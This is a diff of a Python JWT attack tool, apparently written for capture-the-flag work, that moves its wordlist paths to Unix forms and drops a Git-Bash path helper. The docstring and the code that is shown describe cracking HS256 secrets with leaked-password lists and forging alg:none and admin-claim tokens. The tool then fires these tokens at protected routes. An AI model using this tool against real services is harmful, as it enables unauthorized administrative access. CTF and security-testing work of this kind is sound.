@@ -5,7 +5,7 @@ Decodes the token, dictionary-cracks the HS256 secret, mints alg:none and
 privilege-escalated variants, fires every candidate at a route that currently refuses
 you, and scans status + headers + body for a flag.
 
-    python jwtquick.py --token "$TOKEN" --base https://target --test /api/admin/stats
+    python3 jwtquick.py --token "$TOKEN" --base https://target --test /api/admin/stats
 
 Only --token is required; without --base it just cracks and prints candidate tokens.
 Cracking is a two-stage chain by default: the 104k-entry JWT-specific list first
@@ -19,41 +19,19 @@ sometimes a ~40s one instead of ~1s.
 --wordlist pins a single list and skips the chain entirely, for when you already know
 which one you want:
 
-    python jwtquick.py --token "$T" --base URL --test /admin --wordlist /c/Tools/hashcat-6.2.6/hashcat-6.2.6/rockyou.txt
+    python3 jwtquick.py --token "$T" --base URL --test /admin --wordlist ~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
 """
 import argparse, base64, hashlib, hmac, json, os, re, sys, time
 
 FLAG = re.compile(r"\w+\{[^}\n]{4,}\}")
-# Read by Python, not by Git Bash, so a /c/... form will not resolve here.
-SECLISTS = os.environ.get("SECLISTS", "C:/Tools/SecLists").replace("\\", "/")
-if SECLISTS.startswith("/c/"):                      # tolerate a Git-Bash-style SECLISTS
-    SECLISTS = "C:/" + SECLISTS[3:]
+SECLISTS = os.environ.get("SECLISTS", os.path.expanduser("~/Tools/SecLists"))
 DEFAULT_WL = SECLISTS.rstrip("/") + "/Passwords/scraped-JWT-secrets.txt"
-# Same /c/... tolerance as SECLISTS above — read by Python, not Git Bash.
-ROCKYOU = os.environ.get("ROCKYOU", "C:/Tools/hashcat-6.2.6/hashcat-6.2.6/rockyou.txt").replace("\\", "/")
-if ROCKYOU.startswith("/c/"):
-    ROCKYOU = "C:/" + ROCKYOU[3:]
+ROCKYOU = os.environ.get("ROCKYOU", SECLISTS.rstrip("/") + "/Passwords/Leaked-Databases/rockyou.txt")
 # claims worth flipping, and what to flip them to
 PRIV = {"role": "admin", "roles": ["admin"], "isAdmin": True, "is_admin": True,
         "admin": True, "user_type": "admin", "userType": "admin", "scope": "admin",
         "permissions": ["admin"], "type": "admin", "group": "admin"}
 IDC = ("id", "userId", "user_id", "sub", "uid")
-
-def demangle(p):
-    """Undo MSYS/Git-Bash argv path conversion: it rewrites a leading /api/admin/stats
-    into <GitRoot>/api/admin/stats before the interpreter ever sees it."""
-    exe = os.environ.get("EXEPATH")
-    roots = [os.path.dirname(exe)] if exe else []
-    roots += [r"C:\Program Files\Git", r"C:\Program Files (x86)\Git", r"C:\msys64"]
-    norm = p.replace("\\", "/")
-    for root in roots:
-        r = root.replace("\\", "/").rstrip("/")
-        if r and norm.lower().startswith(r.lower() + "/"):
-            fixed = norm[len(r):]
-            sys.stderr.write("[!] de-mangled %r -> %r\n" % (p, fixed))
-            return fixed
-    return norm if norm.startswith("/") else "/" + norm
-
 
 DENY_HINTS = ("unauthorized", "forbidden", "access denied", "invalid token", "invalid signature",
               "expired token", "not authorized", "permission denied", "authentication required",
@@ -178,7 +156,7 @@ def main():
     except ImportError:
         sys.exit("[!] pip install requests")
 
-    url = a.base.rstrip("/") + demangle(a.test)
+    url = a.base.rstrip("/") + a.test
     base_r = requests.get(url, headers={"Authorization": "Bearer " + a.token}, verify=False)
     base_denied = looks_denial(base_r.status_code, base_r.text)
     print(f"\n[*] baseline with your own token: {base_r.status_code} ({len(base_r.content)}b) "
